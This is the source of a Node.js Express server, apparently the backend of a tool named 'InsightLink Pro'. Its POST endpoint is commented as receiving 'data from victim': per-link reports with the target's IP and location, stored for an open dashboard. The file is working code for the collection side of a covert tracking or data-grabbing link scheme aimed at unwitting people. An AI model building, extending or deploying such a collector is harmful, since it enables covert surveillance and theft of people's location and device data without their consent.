
import express from 'express';
import cors from 'cors';
import bodyParser from 'body-parser';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;

// In-memory database (Resets on server restart on Render)
let reports = [];

app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(express.static(path.join(__dirname, 'dist')));

// API to receive data from victim
app.post('/api/reports/:linkId', (req, res) => {
  const { linkId } = req.params;
  const reportData = req.body;
  
  const newReport = { 
    ...reportData, 
    linkId,
    receivedAt: new Date().toISOString() 
  };
  
  reports.unshift(newReport); // Newest at the top
  console.log(`[INTEL] New report received for Node: ${linkId} from IP: ${reportData.location?.ip}`);
  res.status(200).json({ status: 'success' });
});

// API to get all data for dashboard
app.get('/api/all-reports', (req, res) => {
  res.json(reports);
});

// Clear reports (Useful for maintenance)
app.delete('/api/reports', (req, res) => {
  reports = [];
  res.status(200).send('Cleared');
});

// Handle React Routing - must be last
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'dist', 'index.html'));
});

app.listen(PORT, () => {
  console.log(`
  =========================================
  INSIGHTLINK PRO SERVER v2.5
  Status: ACTIVE
  Port: ${PORT}
  Endpoint: /api/reports/:id
  =========================================
  `);
});
